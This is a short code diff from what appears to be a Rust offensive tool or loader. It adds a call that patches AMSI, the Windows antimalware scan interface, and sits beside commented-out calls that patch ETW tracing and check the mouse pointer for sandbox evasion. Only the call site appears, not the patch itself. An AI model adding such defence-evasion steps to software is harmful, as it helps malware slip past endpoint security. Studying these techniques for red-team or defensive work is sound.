@@ -39,6 +39,17 @@ async fn main(){
     };
 
 
+    match patcher::patch_amsi(){
+        Ok(_val) => {
+            println!("[i] {} Patched!","AMSI".magenta());
+        },
+        Err(e) => {
+            let err_msg = format!("{}", e);
+            eprintln!("[!] Failed to patch {}", "AMSI".red());
+            eprintln!("[!] Error occured as {}", err_msg.red());
+        }
+    };
+
     //etw::__check_mouse_pointer();
     
     //new_ntdll_patch_etw().expect("Patching not okie");
